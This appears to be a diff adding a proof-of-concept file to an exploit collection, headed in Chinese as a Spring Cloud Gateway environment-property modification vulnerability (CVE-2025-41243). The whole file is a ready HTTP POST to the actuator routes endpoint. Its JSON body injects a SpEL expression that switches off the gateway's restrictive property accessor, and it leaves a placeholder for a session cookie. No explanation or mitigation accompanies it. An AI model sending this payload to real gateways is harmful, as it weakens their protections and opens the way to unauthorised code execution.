@@ -1,0 +1,26 @@
+# Spring Cloud Gateway 环境属性修改漏洞(CVE-2025-41243)
+POST /actuator/gateway/routes/test HTTP/1.1
+Host: www.xwd_test.com
+Connection: keep-alive
+Content-Length: 529
+Accept-Language: zh
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Cookie: psession=<YOUR_PSESSION_HERE>
+Content-Type: application/json
+Accept-Encoding: gzip, deflate, br, zstd
+
+{
+            "predicates": [{"name": "Path", "args": {"_genkey_0": "/actuators/test"}}],
+            "filters": [
+                {
+                    "name": "RewritePath",
+                    "args": {
+                        "_genkey_0": "/test",
+                        "_genkey_1": " #{ @systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = false}",
+                    },
+                }
+            ],
+            "uri": "http://example.com",
+            "order": -1,
+        }
